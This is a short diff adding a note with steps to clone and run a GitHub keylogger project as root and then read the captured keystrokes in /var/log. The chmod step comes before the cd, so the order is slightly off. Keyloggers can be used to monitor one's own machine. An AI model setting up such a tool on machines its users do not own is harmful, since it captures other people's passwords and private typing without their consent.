@@ -1,0 +1,9 @@
+git clone https://github.com/gsingh93/simple-key-logger.git
+
+sudo chmod +x simple-key-logger
+
+cd simple-key-logger
+
+sudo ./skeylogger
+
+now go to filesystem-> var-> log to see the logs
